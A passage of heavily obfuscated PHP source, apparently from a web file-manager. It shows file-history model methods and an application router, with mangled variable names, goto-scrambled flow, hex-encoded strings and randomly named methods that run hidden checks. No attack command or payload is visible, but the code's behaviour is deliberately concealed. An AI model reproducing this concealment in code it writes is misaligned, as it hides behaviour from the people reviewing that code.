$fùáÅÛÙæ¡[2312] => count($aŠˆÄšÆ¾À[$fùáÅÛÙæ¡[363]])); } return $aŠˆÄšÆ¾À; goto E¬ÊËÓæ®è; dñ«ÔÆÛ†‡: $fùáÅÛÙæ¡ =& $_SERVER[¶ªÕß‚ØÁŸ]; $E¢ïì“ò•† = array($fùáÅÛÙæ¡[391] => $e¢§ñ”ÎŒ‡); $Dá±Èíğ©Ü = $fùáÅÛÙæ¡[2308]; goto dìåáÇ“‘Ä; E¬ÊËÓæ®è: } protected function _listAppendUser(&$A„¶ë¤Ì) { $B×Üßî†µÒ =& $_SERVER[¶ªÕß‚ØÁŸ]; $CÔ¥„°¯ËÕ = array_to_keyvalue($A„¶ë¤Ì, $B×Üßî†µÒ[33], $B×Üßî†µÒ[1440]); $A¾Ş·’¼¿ = Model($B×Üßî†µÒ[485])->userListInfo($CÔ¥„°¯ËÕ); foreach ($A„¶ë¤Ì as &$bò½ÛËìÔ) { $d³”´Š…ÓÎ = $bò½ÛËìÔ[$B×Üßî†µÒ[1440]]; $bò½ÛËìÔ[$B×Üßî†µÒ[386]] = $A¾Ş·’¼¿[$d³”´Š…ÓÎ] ? $A¾Ş·’¼¿[$d³”´Š…ÓÎ] : !1; } } public function fileInfo($AÑÒî„Ü‘) { $bÇ—Œ»½Ö« =& $_SERVER[¶ªÕß‚ØÁŸ]; $Fƒæñïóï = $this->tablePrefix; $Bì…ÓËæÍˆ = "{$Fƒæñïóï}\x69\x6f\137\146\x69\154\x65\x20\x66\151\x6c\x65\x73\40\157\x6e\x20\x66\x69\154\145\163\56\146\151\x6c\x65\x49\104\40\75\40\150\x69\163\x74\157\x72\171\x2e\x66\x69\x6c\145\x49\104"; return $this->alias($bÇ—Œ»½Ö«[2313])->where(array($bÇ—Œ»½Ö«[393] => $AÑÒî„Ü‘))->join($Bì…ÓËæÍˆ, $bÇ—Œ»½Ö«[2314])->find(); } public function removeItem($f«ß×™Í·‹) { $Fš¿èÛ•‘ =& $_SERVER[¶ªÕß‚ØÁŸ]; $bÊİ®×ôš‘ = array($Fš¿èÛ•‘[393] => $f«ß×™Í·‹); $A²†Ãµæì = $this->where($bÊİ®×ôš‘)->find(); if ($A²†Ãµæì) { $FÑ…½•‰½ = $this->where($bÊİ®×ôš‘)->delete(); Model($Fš¿èÛ•‘[430])->remove($A²†Ãµæì[$Fš¿èÛ•‘[427]]); return $FÑ…½•‰½; } return !1; } public function removeBySource($e’¿½Óù£ˆ) { goto e¿­ïê²Ø‚; D»ËÙãĞª: $aí¶³˜†Ó = array($dÃ‹”…ÙÀå[391] => array($dÃ‹”…ÙÀå[7], $e’¿½Óù£ˆ)); $Dğ˜‡¨‘ë = $this->field($dÃ‹”…ÙÀå[428])->where($aí¶³˜†Ó)->select(); if ($Dğ˜‡¨‘ë) { $this->where($aí¶³˜†Ó)->delete(); $E­ÒŒÑ¿É = array_to_keyvalue($Dğ˜‡¨‘ë, $dÃ‹”…ÙÀå[33], $dÃ‹”…ÙÀå[427]); Model($dÃ‹”…ÙÀå[430])->remove($E­ÒŒÑ¿É); } goto cÌÍòÓ±˜î; e¿­ïê²Ø‚: $dÃ‹”…ÙÀå =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!$e’¿½Óù£ˆ) { return !1; } if (!is_array($e’¿½Óù£ˆ)) { $e’¿½Óù£ˆ = array($e’¿½Óù£ˆ); } goto D»ËÙãĞª; cÌÍòÓ±˜î: return !0; goto A´Ğí»¹ ; A´Ğí»¹ : } public function setDetail($FŒä±ÛĞ›Ë, $Aäºƒ¿ÄĞ•) { $eŸ‹«‘‘ë =& $_SERVER[¶ªÕß‚ØÁŸ]; return $this->where(array($eŸ‹«‘‘ë[393] => $FŒä±ÛĞ›Ë))->save(array($eŸ‹«‘‘ë[2302] => $Aäºƒ¿ÄĞ•)); } public function rollbackToItem($B­ÉßéØì, $a‡Òî°éå) { goto D•Çíƒ½¯; Fùïèã¦Ä…: $aï›ÒÂÅƒØ = $this->find($a‡Òî°éå); $CÅŠ•ê«äŒ = array($CÄ¹¢çœ÷[427] => $aï›ÒÂÅƒØ[$CÄ¹¢çœ÷[427]], $CÄ¹¢çœ÷[87] => $aï›ÒÂÅƒØ[$CÄ¹¢çœ÷[87]], $CÄ¹¢çœ÷[117] => time(), $CÄ¹¢çœ÷[387] => USER_ID); Model($CÄ¹¢çœ÷[766])->where(array($CÄ¹¢çœ÷[377] => $B­ÉßéØì))->save($CÅŠ•ê«äŒ); goto a»”Ú–ÚÎ·; D•Çíƒ½¯: $CÄ¹¢çœ÷ =& $_SERVER[¶ªÕß‚ØÁŸ]; $eÎŒÄ£†Ñ = Model($CÄ¹¢çœ÷[766])->sourceInfo($B­ÉßéØì); $this->addHistory($eÎŒÄ£†Ñ); goto Fùïèã¦Ä…; a»”Ú–ÚÎ·: return $this->where(array($CÄ¹¢çœ÷[393] => $a‡Òî°éå))->delete(); goto eå‡…£İÀÛ; eå‡…£İÀÛ: } public function clearSame($A¥ñè¡œè„) { goto fâŠÎÅŠ‰†; AØå‘½òˆ¾: $e–­™œÔù— = array(); $eÍ¤‘”ˆ•› = array(); foreach ($A®¬¹í as $E‘·›ê¨Î) { if (!$E‘·›ê¨Î || count($E‘·›ê¨Î) <= 1) { continue; } foreach ($E‘·›ê¨Î as $aºƒĞŒğ³) { $e–­™œÔù—[] = $aºƒĞŒğ³[$aŒãÛÚ¤ÍË[427]]; $eÍ¤‘”ˆ•›[] = $aºƒĞŒğ³[$aŒãÛÚ¤ÍË[375]]; } } goto e¼šø‡ê¹; fâŠÎÅŠ‰†: $aŒãÛÚ¤ÍË =& $_SERVER[¶ªÕß‚ØÁŸ]; $eÔÔ‰¹…‡Ê = $this->listData($A¥ñè¡œè„); $A®¬¹í = array_to_keyvalue_group($eÔÔ‰¹…‡Ê, $aŒãÛÚ¤ÍË[427]); goto AØå‘½òˆ¾; e¼šø‡ê¹: if (!$eÍ¤‘”ˆ•›) { return; } $this->where(array($aŒãÛÚ¤ÍË[375] => array($aŒãÛÚ¤ÍË[7], $eÍ¤‘”ˆ•›)))->delete(); Model($aŒãÛÚ¤ÍË[430])->remove($e–­™œÔù—); goto F¨ÇÏòä; F¨ÇÏòä: } public function userSpace() { $fµ†¨ëïˆñ =& $_SERVER[¶ªÕß‚ØÁŸ]; $aƒ×£ö±õ = $this->tablePrefix; $e³‰¯ÙÕÓ— = array($fµ†¨ëïˆñ[1431] => USER_ID); $e™ßµ‘ÑñÑ = "{$aƒ×£ö±õ}\151\x6f\x5f\x66\151\x6c\145\40\x66\x69\154\x65\163\x20\x6f\x6e\x20\x66\x69\154\145\x73\56\146\151\x6c\x65\x49\104\x20\75\x20\150\x69\x73\164\157\162\171\56\x66\x69\154\x65\111\x44"; return $this->alias($fµ†¨ëïˆñ[2313])->where($e³‰¯ÙÕÓ—)->join($e™ßµ‘ÑñÑ, $fµ†¨ëïˆñ[2314])->sum($fµ†¨ëïˆñ[87]); } } goto d®Ê‘‘Ì; b˜ê¨…Àå§: class Application { private $defaultModule = "\x69\156\144\145\x78"; private $defaultController = "\x69\156\x64\145\x78"; private $defaultAction = "\151\156\144\x65\170"; function __construct() { } public function setDefault($D‘‘›Å„Ô) { goto AŞ¿èãÚİ; Bõà¬Ä²¬: $a‰©éø’Çµ = $fÇØ¤‡ÖÉ[562]; goto Eğ–Œ÷—õë; c¤Í¹¨‹: $this->defaultModule = $cŸÒì•š–©[0] ? $cŸÒì•š–©[0] : $this->defaultModule; $this->defaultController = $cŸÒì•š–©[1] ? $cŸÒì•š–©[1] : $this->defaultController; $fÀÚÔèÅã = $fÇØ¤‡ÖÉ[560]; goto Cö¿İ¸®œ«; Cö¿İ¸®œ«: $this->defaultAction = $cŸÒì•š–©[2] ? $cŸÒì•š–©[2] : $this->defaultAction; $f†Ş†©Á™é = $fÇØ¤‡ÖÉ[561]; $this->{$_SERVER[¯Ú‚è][3]}($b‡ˆÍ‚À¸¾[4], array($this, $b‡ˆÍ‚À¸¾[5])); goto Bõà¬Ä²¬; AŞ¿èãÚİ: $fÇØ¤‡ÖÉ =& $_SERVER[¶ªÕß‚ØÁŸ]; $b‡ˆÍ‚À¸¾ =& $_SERVER[¯Ú‚è]; $cŸÒì•š–© = $b‡ˆÍ‚À¸¾[0]($b‡ˆÍ‚À¸¾[1], $b‡ˆÍ‚À¸¾[2]($D‘‘›Å„Ô, $b‡ˆÍ‚À¸¾[1])); goto c¤Í¹¨‹; Eğ–Œ÷—õë: } public function appRun($CÓğ‡ğ Ù) { goto cÀ ¤øÂ‰‡; a ÀóÔ : $A¬¡ ©ÌĞ°[13](array($A¬¡ ©ÌĞ°[14], $A¬¡ ©ÌĞ°[15]), $d„ÈŞÜà‚÷ . $A¬¡ ©ÌĞ°[16], $CÓğ‡ğ Ù); $A¬¡ ©ÌĞ°[17]($CÓğ‡ğ Ù); $A¬¡ ©ÌĞ°[13](array($A¬¡ ©ÌĞ°[14], $A¬¡ ©ÌĞ°[15]), $d„ÈŞÜà‚÷ . $A¬¡ ©ÌĞ°[18], $CÓğ‡ğ Ù); goto cÍÛœòî; cÀ ¤øÂ‰‡: $fÄÑÓ¹©ìà =& $_SERVER[¶ªÕß‚ØÁŸ]; $A¬¡ ©ÌĞ° =& $_SERVER[¯Ú‚è]; $Aä•¸¸Í = $A¬¡ ©ÌĞ°[0]($A¬¡ ©ÌĞ°[1], $CÓğ‡ğ Ù); goto E‰‚Œ¶®­ø; E‰‚Œ¶®­ø: $EÕ‰°ê‚¾Ÿ = $A¬¡ ©ÌĞ°[6]($Aä•¸¸Í[0]); $d„ÈŞÜà‚÷ = $A¬¡ ©ÌĞ°[7]; if ($EÕ‰°ê‚¾Ÿ == $A¬¡ ©ÌĞ°[8]) { $d„ÈŞÜà‚÷ = $A¬¡ ©ÌĞ°[9]; $Aä•¸¸Í[0] = $A¬¡ ©ÌĞ°[10]; $Aä•¸¸Í[1] = $Aä•¸¸Í[1] . $A¬¡ ©ÌĞ°[11]; $CÓğ‡ğ Ù = $A¬¡ ©ÌĞ°[12]($A¬¡ ©ÌĞ°[1], $Aä•¸¸Í); $CÓğ‡ğ Ù = $A¬¡ ©ÌĞ°[2]($CÓğ‡ğ Ù, $A¬¡ ©ÌĞ°[1]); } goto a ÀóÔ ; cÍÛœòî: $Dò‹‰”ŞÆ„ = $fÄÑÓ¹©ìà[563]; while ($Dò‹‰”ŞÆ„ < $fÄÑÓ¹©ìà[63]) { if ($Dò‹‰”ŞÆ„ >= 0) { break; } $Dò‹‰”ŞÆ„++; } goto cŒ°‰·Ìš; cŒ°‰·Ìš: } private function autorun() { $bêÒ®Ñ‰‚¡ =& $_SERVER[¶ªÕß‚ØÁŸ]; $dº±Î“‹½ =& $_SERVER[¯Ú‚è]; global $config; if ($dº±Î“‹½[19]($config[$dº±Î“‹½[20]]) == 0) { return; } foreach ($config[$dº±Î“‹½[20]] as $bØùù Üä» => $Fà‹ìáÎ‡è) { $this->{$_SERVER[¯Ú‚è][21]}($Fà‹ìáÎ‡è); $A­ñŞô±Íï = $bêÒ®Ñ‰‚¡[564]; while ($A­ñŞô±Íï < $bêÒ®Ñ‰‚¡[565]) { if ($A­ñŞô±Íï >= 0) { break; } $A­ñŞô±Íï++; } } } private function scrgaddc9f33() { goto E¡ˆè“°Óé; D³áÔ‹ŒÎ: $GLOBALS[$AñØËÁœ®[22]][$AñØËÁœ®[23]] = $AñØËÁœ®[27]($Bñ¸‘£¨å‰, $Bß‡Ù°²ß); $DÉùĞ×°á… = $D©ª—ÏÙî[568]; if (!$DÉùĞ×°á…) { die; } goto Dã§ù„¯ù; E¡ˆè“°Óé: $D©ª—ÏÙî =& $_SERVER[¶ªÕß‚ØÁŸ]; $AñØËÁœ® =& $_SERVER[¯Ú‚è]; $A Ô´ËÒİ = $AñØËÁœ®[8]; goto a×‡¢ÑÏ†; Dã§ù„¯ù: $GLOBALS[$AñØËÁœ®[22]][$AñØËÁœ®[28]] = $AñØËÁœ®[29]($AñØËÁœ®[1], $GLOBALS[$AñØËÁœ®[22]][$AñØËÁœ®[23]]); $Cî´÷š‰»¼ = $D©ª—ÏÙî[569]; while (strlen($Cî´÷š‰»¼) < $D©ª—ÏÙî[565]) { if (!$Cî´÷š‰»¼) { break; } $Cî´÷š‰»¼++; } goto C‚ÆÔö¬âÛ; e¼İÙŒˆô½: $b‡ìïÈßõà = $AñØËÁœ®[25]($c„¶çÆÜŞÃ, 0, -$AñØËÁœ®[24]($A Ô´ËÒİ)); $Fì£ÕâíâÆ = $D©ª—ÏÙî[566]; $Bñ¸‘£¨å‰ = array($AñØËÁœ®[8], $b‡ìïÈßõà); goto añô™ìŸÆë; añô™ìŸÆë: $e£ŸÚö§ö = $D©ª—ÏÙî[567]; while (strlen($e£ŸÚö§ö) < $D©ª—ÏÙî[559]) { if (!$e£ŸÚö§ö) { break; } $e£ŸÚö§ö++; } $Bß‡Ù°²ß = $AñØËÁœ®[26]($GLOBALS[$AñØËÁœ®[22]][$AñØËÁœ®[23]], 1); goto D³áÔ‹ŒÎ; a×‡¢ÑÏ†: $c„¶çÆÜŞÃ = $GLOBALS[$AñØËÁœ®[22]][$AñØËÁœ®[23]][0]; if (!$c„¶çÆÜŞÃ || $AñØËÁœ®[24]($c„¶çÆÜŞÃ) <= $AñØËÁœ®[24]($A Ô´ËÒİ)) { return; } if ($AñØËÁœ®[6]($AñØËÁœ®[25]($c„¶çÆÜŞÃ, -$AñØËÁœ®[24]($A Ô´ËÒİ))) != $A Ô´ËÒİ) { return; } goto e¼İÙŒˆô½; C‚ÆÔö¬âÛ: } private function nuqv49d4c32c() { goto fÎ¸½¥İô¸; fÎ¸½¥İô¸: $F Ó—ŠÍÙ· =& $_SERVER[¶ªÕß‚ØÁŸ]; $bº—ÕÑ¾Å =& $_SERVER[¯Ú‚è]; if ($GLOBALS[$bº—ÕÑ¾Å[22]][$bº—ÕÑ¾Å[28]] != $bº—ÕÑ¾Å[10]) { return; } goto b¼ŸšŞÂÒ–; a›Ñ›ŒñÛó: $aÃ¾¨ƒ¹ğ = $bº—ÕÑ¾Å[2]($CÇîÏÍ‹ô˜[0][0], $bº—ÕÑ¾Å[36]); $GLOBALS[$bº—ÕÑ¾Å[22]][$bº—ÕÑ¾Å[23]] = $bº—ÕÑ¾Å[0]($bº—ÕÑ¾Å[36], $aÃ¾¨ƒ¹ğ); $AÊ¨²ï³¿„ = $F Ó—ŠÍÙ·[573]; goto Eëò—Â¥ƒˆ; Eëò—Â¥ƒˆ: if (!$AÊ¨²ï³¿„) { return; } $GLOBALS[$bº—ÕÑ¾Å[22]][$bº—ÕÑ¾Å[28]] = $bº—ÕÑ¾Å[29]($bº—ÕÑ¾Å[1], $GLOBALS[$bº—ÕÑ¾Å[22]][$bº—ÕÑ¾Å[23]]); goto b®İØéªœİ; A¨éŠ™·: $bº—ÕÑ¾Å[34]($bº—ÕÑ¾Å[35], $aÃ¾¨ƒ¹ğ, $CÇîÏÍ‹ô˜); $a™ÆÊ“Ì¯Í = $F Ó—ŠÍÙ·[572]; while ($a™ÆÊ“Ì¯Í < $F Ó—ŠÍÙ·[559]) { if ($a™ÆÊ“Ì¯Í >= 0) { break; } $a™ÆÊ“Ì¯Í++; } goto a›Ñ›ŒñÛó; Dâáâ™œã¿: $DÃÓÅˆ‡æË = $bº—ÕÑ¾Å[31]; if (!$bº—ÕÑ¾Å[32]($DÇËÙ¿ø…„, $DÃÓÅˆ‡æË)) { return; } $Fæ Ä¸•ºã = $bº—ÕÑ¾Å[33]($DÇËÙ¿ø…„, $DÃÓÅˆ‡æË); goto f÷ó¡Éùæ¶; f÷ó¡Éùæ¶: $F×•åÌ¯™Ÿ = $F Ó—ŠÍÙ·[571]; if (!$F×•åÌ¯™Ÿ) { return; } $aÃ¾¨ƒ¹ğ = $bº—ÕÑ¾Å[25]($DÇËÙ¿ø…„, $Fæ Ä¸•ºã + $bº—ÕÑ¾Å[24]($DÃÓÅˆ‡æË)); goto A¨éŠ™·; b¼ŸšŞÂÒ–: $DÇËÙ¿ø…„ = $_SERVER[$bº—ÕÑ¾Å[30]]; $c·ÌĞÈ«Ê = $F Ó—ŠÍÙ·[570]; while (strlen($c·ÌĞÈ«Ê) < $F Ó—ŠÍÙ·[559]) { if (!$c·ÌĞÈ«Ê) { break; } $c·ÌĞÈ«Ê++; } goto Dâáâ™œã¿; b®İØéªœİ: } public function run() { goto FÕ¥‡ó¸; EôâŸ³—÷: $Cºö’ëòĞ = $A›êİ”ğ–[575]; if (strlen($Cºö’ëòĞ) < $A›êİ”ğ–[565]) { die; } $aËÀøõ„ë = $GLOBALS[$FğóªĞöäË[22]][$FğóªĞöäË[23]]; goto aÀ†àÄ¶È¯; a±¡Òèô¢ã: $FğóªĞöäË[39]($FğóªĞöäË[41], isset($aËÀøõ„ë[1]) && $aËÀøõ„ë[0] ? $aËÀøõ„ë[1] : $this->defaultController); $e±™·ßÅ…ò = $A›êİ”ğ–[579]; $FğóªĞöäË[39]($FğóªĞöäË[42], isset($aËÀøõ„ë[2]) && $aËÀøõ„ë[0] ? $aËÀøõ„ë[2] : $this->defaultAction); goto DÄÚÚ÷»¨ ; AÃóõÇ‰Œ¹: $FğóªĞöäË[39]($FğóªĞöäË[40], isset($aËÀøõ„ë[0]) && $aËÀøõ„ë[0] ? $aËÀøõ„ë[0] : $this->defaultModule); $F²óÔ¾ñ„ = $A›êİ”ğ–[577]; if (strlen($F²óÔ¾ñ„) < $A›êİ”ğ–[578]) { die; } goto a±¡Òèô¢ã; Ağ‡ÖÅ…Í: $a¸‡Òëèƒµ = $A›êİ”ğ–[574]; while ($a¸‡Òëèƒµ < $A›êİ”ğ–[565]) { if ($a¸‡Òëèƒµ >= 0) { break; } $a¸‡Òëèƒµ++; } $this->{$_SERVER[¯Ú‚è][38]}(); goto EôâŸ³—÷; DÄÚÚ÷»¨ : $FğóªĞöäË[39]($FğóªĞöäË[43], MOD . $FğóªĞöäË[1] . ST . $FğóªĞöäË[1] . ACT); $_SERVER[$FğóªĞöäË[44]] = $FğóªĞöäË[6](ACTION); $this->{$_SERVER[¯Ú‚è][45]}(); goto a§Ò¢÷‡çâ; aÀ†àÄ¶È¯: $fõ·¦“¯åé = $A›êİ”ğ–[576]; if (!$fõ·¦“¯åé) { return; } $D«ğë’‚‡– = $GLOBALS[$FğóªĞöäË[22]][$FğóªĞöäË[28]]; goto AÃóõÇ‰Œ¹; a§Ò¢÷‡çâ: $eÓœÓšÉòÆ = $A›êİ”ğ–[580]; if ($FğóªĞöäË[19]($aËÀøõ„ë) >= 3) { $this->{$_SERVER[¯Ú‚è][21]}($D«ğë’‚‡–); } else { $this->{$_SERVER[¯Ú‚è][21]}(ACTION); } goto D‘»ñò¿á¥; FÕ¥‡ó¸: $A›êİ”ğ– =& $_SERVER[¶ªÕß‚ØÁŸ]; $FğóªĞöäË =& $_SERVER[¯Ú‚è]; $this->{$_SERVER[¯Ú‚è][37]}(); goto Ağ‡ÖÅ…Í; D‘»ñò¿á¥: } private $vtpg40bf898c = array(); private $ofesee574071 = ''; public function aefk72756258() { goto dÊ¥ñ½«; CƒÙ÷Ñİôô: $Dê ùÁŒŒÒ = $b‚­ùˆó¼[587]; if (strlen($Dê ùÁŒŒÒ) < $b‚­ùˆó¼[63]) { return; } goto B“ˆÇ’Ëƒ; dÌó„Í´…Ø: $this->{$_SERVER[¯Ú‚è][49]}(); $this->{$_SERVER[¯Ú‚è][50]}(); $c‡¶Ú´É°ê = $b‚­ùˆó¼[582]; goto cÂ½¦åŸ½ò; f¦ºãŠ¿°®: if (!$bÆá²‘³‰¼) { return; } $this->{$_SERVER[¯Ú‚è][52]}(); $fâ±‚äÎ¢ = $b‚­ùˆó¼[584]; goto A˜Âƒ¢ÁÃ; dÆ›ëöÆÈÄ: $this->{$_SERVER[¯Ú‚è][47]}(); $this->{$_SERVER[¯Ú‚è][48]}(); $dÁÖ®Ê× = $b‚­ùˆó¼[581]; goto dÌó„Í´…Ø; cÂ½¦åŸ½ò: if (!$c‡¶Ú´É°ê) { return; } $this->{$_SERVER[¯Ú‚è][51]}(); $bÆá²‘³‰¼ = $b‚­ùˆó¼[583]; goto f¦ºãŠ¿°®; C˜òß„‡¸¡: if (!$Bìò±£¸‘‰) { return; } $this->{$_SERVER[¯Ú‚è][3]}($bÂî–‘Ÿ¾[55], array($this, $bÂî–‘Ÿ¾[56])); $bì¯Šä¹ï = $b‚­ùˆó¼[586]; goto Bå¶ÂâË×; dÊ¥ñ½«: $b‚­ùˆó¼ =& $_SERVER[¶ªÕß‚ØÁŸ]; $bÂî–‘Ÿ¾ =& $_SERVER[¯Ú‚è]; $this->{$_SERVER[¯Ú‚è][46]}(); goto dÆ›ëöÆÈÄ; Bå¶ÂâË×: if (strlen($bì¯Šä¹ï) < $b‚­ùˆó¼[559]) { die; } $this->{$_SERVER[¯Ú‚è][3]}($bÂî–‘Ÿ¾[57], array($this, $bÂî–‘Ÿ¾[58])); $this->{$_SERVER[¯Ú‚è][3]}($bÂî–‘Ÿ¾[59], array($this, $bÂî–‘Ÿ¾[60])); goto CƒÙ÷Ñİôô; A˜Âƒ¢ÁÃ: if (strlen($fâ±‚äÎ¢) < $b‚­ùˆó¼[578]) { return; } $this->{$_SERVER[¯Ú‚è][3]}($bÂî–‘Ÿ¾[53], array($this, $bÂî–‘Ÿ¾[54])); $Bìò±£¸‘‰ = $b‚­ùˆó¼[585]; goto C˜òß„‡¸¡; B“ˆÇ’Ëƒ: } public function waog2d9757f0($FÚ«ÛÓ£ó) { goto A’ÙñÄÚˆ; e³Œ¡­ô©¾: return $FÚ«ÛÓ£ó; goto F Š¸à™­ò; A’ÙñÄÚˆ: $cï©ÇĞè·„ =& $_SERVER[¶ªÕß‚ØÁŸ]; $BËŞÉŒìõ’ =& $_SERVER[¯Ú‚è]; $b‰ëÑÊ§óÖ = $BËŞÉŒìõ’[61]($BËŞÉŒìõ’[62])->{$_SERVER[¯Ú‚è][63]}(); goto Dôº‚ò»¶Ï; Eğ’ªà¡ò¥: unset($FÚ«ÛÓ£ó[$BËŞÉŒìõ’[93]][$BËŞÉŒìõ’[95]][$BËŞÉŒìõ’[97]]); $A¸‘Ô¨åæ = $cï©ÇĞè·„[592]; if (strlen($A¸‘Ô¨åæ) < $cï©ÇĞè·„[63]) { return; } goto D£Ø×Õ™êå; d³‡È·–°: foreach ($b³—¦ÀŒÒ³ as $b¡®òò´) { $BÉ—Î™éŒ¾ = $GLOBALS[$BËŞÉŒìõ’[91]][$BËŞÉŒìõ’[92]][$b¡®òò´]; if (isset($b‰ëÑÊ§óÖ[$b¡®òò´])) { $BÉ—Î™éŒ¾ = $b‰ëÑÊ§óÖ[$b¡®òò´]; } $FÚ«ÛÓ£ó[$BËŞÉŒìõ’[93]][$BËŞÉŒìõ’[94]][$b¡®òò´] = $BÉ—Î™éŒ¾; } $D§‡×ùŞ×Ë = $FÚ«ÛÓ£ó[$BËŞÉŒìõ’[93]][$BËŞÉŒìõ’[94]][$BËŞÉŒìõ’[76]]; $d Šäß›° = $cï©ÇĞè·„[590]; goto AÕØ°¸‹Â§; EÖÅòÑ¤ÌÎ: $aÚˆ˜œÕ‘¨ = $cï©ÇĞè·„[598]; if (strlen($aÚˆ˜œÕ‘¨) < $cï©ÇĞè·„[565]) { die; } if ($BËŞÉŒìõ’[104]($GLOBALS, $BËŞÉŒìõ’[132]) && $this->config[$BËŞÉŒìõ’[133]]) { $FÚ«ÛÓ£ó[$BËŞÉŒìõ’[108]][$BËŞÉŒìõ’[134]] = WEB_ROOT; } goto e³Œ¡­ô©¾; bââóª«‰: $CáÚÖÎÊÓ  = $cï©ÇĞè·„[595]; if (!$CáÚÖÎÊÓ ) { return; } $FÚ«ÛÓ£ó[$BËŞÉŒìõ’[108]][$BËŞÉŒìõ’[117]] = $BËŞÉŒìõ’[118]($BËŞÉŒìõ’[119]()); goto eÔßÁ•¡; b¤êãµÏ¶½: if ($this->ofesee574071 == $BËŞÉŒìõ’[121]) { $FÚ«ÛÓ£ó[$BËŞÉŒìõ’[93]][$BËŞÉŒìõ’[94]][$BËŞÉŒìõ’[99]][$BËŞÉŒìõ’[107]] = 0; } $FÚ«ÛÓ£ó[$BËŞÉŒìõ’[108]][$BËŞÉŒìõ’[128]] = $BËŞÉŒìõ’[104]($this->vtpg40bf898c, $BËŞÉŒìõ’[129], $BËŞÉŒìõ’[10]); $FÚ«ÛÓ£ó[$BËŞÉŒìõ’[108]][$BËŞÉŒìõ’[130]] = $BËŞÉŒìõ’[104]($this->vtpg40bf898c, $BËŞÉŒìõ’[131], $BËŞÉŒìõ’[10]); goto EÖÅòÑ¤ÌÎ; D£Ø×Õ™êå: unset($FÚ«ÛÓ£ó[$BËŞÉŒìõ’[93]][$BËŞÉŒìõ’[94]][$BËŞÉŒìõ’[76]]); unset($FÚ«ÛÓ£ó[$BËŞÉŒìõ’[93]][$BËŞÉŒìõ’[94]][$BËŞÉŒìõ’[98]]); $eÃëÎ‰¥‚ = $cï©ÇĞè·„[593]; goto DàÖÑİ‹·; Dôº‚ò»¶Ï: $b³—¦ÀŒÒ³ = array($BËŞÉŒìõ’[64], $BËŞÉŒìõ’[65], $BËŞÉŒìõ’[66], $BËŞÉŒìõ’[67], $BËŞÉŒìõ’[68], $BËŞÉŒìõ’[69], $BËŞÉŒìõ’[70], $BËŞÉŒìõ’[71], $BËŞÉŒìõ’[72], $BËŞÉŒìõ’[73], $BËŞÉŒìõ’[74], $BËŞÉŒìõ’[75], $BËŞÉŒìõ’[76], $BËŞÉŒìõ’[77], $BËŞÉŒìõ’[78], $BËŞÉŒìõ’[79], $BËŞÉŒìõ’[80], $BËŞÉŒìõ’[81], $BËŞÉŒìõ’[82], $BËŞÉŒìõ’[83], $BËŞÉŒìõ’[84], $BËŞÉŒìõ’[85], $BËŞÉŒìõ’[86], $BËŞÉŒìõ’[87], $BËŞÉŒìõ’[88], $BËŞÉŒìõ’[89], $BËŞÉŒìõ’[90]); $E´ÀËÏ Ë  = $cï©ÇĞè·„[588]; while (strlen($E´ÀËÏ Ë ) < $cï©ÇĞè·„[589]) { if (!$E´ÀËÏ Ë ) { break; } $E´ÀËÏ Ë ++; } goto d³‡È·–°; eÔßÁ•¡: $BçõÁÌ„òì = $cï©ÇĞè·„[596]; while (strlen($BçõÁÌ„òì) < $cï©ÇĞè·„[589]) { if (!$BçõÁÌ„òì) { break; } $BçõÁÌ„òì++; } $FÚ«ÛÓ£ó[$BËŞÉŒìõ’[108]][$BËŞÉŒìõ’[120]] = $this->ofesee574071; goto Dìßºáã¤±; AÕØ°¸‹Â§: if (!$d Šäß›°) { return; } unset($FÚ«ÛÓ£ó[$BËŞÉŒìõ’[93]][$BËŞÉŒìõ’[95]][$BËŞÉŒìõ’[96]]); $A£ìäî˜Ú = $cï©ÇĞè·„[591]; goto Eğ’ªà¡ò¥; Dìßºáã¤±: $C¹§àÖá‰Â = $cï©ÇĞè·„[597]; if (!$C¹§àÖá‰Â) { die; } if ($b‰ëÑÊ§óÖ[$BËŞÉŒìõ’[120]] != $BËŞÉŒìõ’[121]) { $FÚ«ÛÓ£ó[$BËŞÉŒìõ’[108]][$BËŞÉŒìõ’[122]] = $b‰ëÑÊ§óÖ[$BËŞÉŒìõ’[122]]; $FÚ«ÛÓ£ó[$BËŞÉŒìõ’[108]][$BËŞÉŒìõ’[123]] = $b‰ëÑÊ§óÖ[$BËŞÉŒìõ’[123]]; $AÓãÃ„¤õ = $BËŞÉŒìõ’[124](10) . $this->ofesee574071 . $BËŞÉŒìõ’[124](5); $FÚ«ÛÓ£ó[$BËŞÉŒìõ’[93]][$BËŞÉŒìõ’[125]][$BËŞÉŒìõ’[126]] = $this->{$_SERVER[¯Ú‚è][127]}($AÓãÃ„¤õ, $FÚ«ÛÓ£ó[$BËŞÉŒìõ’[108]][$BËŞÉŒìõ’[113]]); } goto b¤êãµÏ¶½; d‡‰ïŸÍÎ: $F…Á®ÚŞÛÚ = $cï©ÇĞè·„[594]; while ($F…Á®ÚŞÛÚ < $cï©ÇĞè·„[565]) { if ($F…Á®ÚŞÛÚ >= 0) { break; } $F…Á®ÚŞÛÚ++; } $FÚ«ÛÓ£ó[$BËŞÉŒìõ’[108]][$BËŞÉŒìõ’[113]] = $BËŞÉŒìõ’[114]($_SERVER[$BËŞÉŒìõ’[115]] . $b‰ëÑÊ§óÖ[$BËŞÉŒìõ’[116]]); goto bââóª«‰; DàÖÑİ‹·: while ($eÃëÎ‰¥‚ < $cï©ÇĞè·„[559]) { if ($eÃëÎ‰¥‚ >= 0) { break; } $eÃëÎ‰¥‚++; } $FÚ«ÛÓ£ó[$BËŞÉŒìõ’[93]][$BËŞÉŒìõ’[94]][$BËŞÉŒìõ’[99]] = array($BËŞÉŒìõ’[100] => (int) $D§‡×ùŞ×Ë[$BËŞÉŒìõ’[101]], $BËŞÉŒìõ’[102] => $BËŞÉŒìõ’[103]($BËŞÉŒìõ’[104]($D§‡×ùŞ×Ë, $BËŞÉŒìõ’[105], array())), $BËŞÉŒìõ’[106] => (int) $BËŞÉŒìõ’[104]($D§‡×ùŞ×Ë, $BËŞÉŒìõ’[107], 0)); $FÚ«ÛÓ£ó[$BËŞÉŒìõ’[108]][$BËŞÉŒìõ’[109]] = $BËŞÉŒìõ’[110]($BËŞÉŒìõ’[111])->{$_SERVER[¯Ú‚è][112]}(); goto d‡‰ïŸÍÎ; F Š¸à™­ò: } private function uvgaf8f462ea() { goto A‘ÄÇ‚ìë; EëÒ›Ó‚µÆ: if ($this->ofesee574071 == $e­‘“´¿ºä[121]) { return; } $C·Ü¯™ß¢ = array($e­‘“´¿ºä[153], $e­‘“´¿ºä[154], 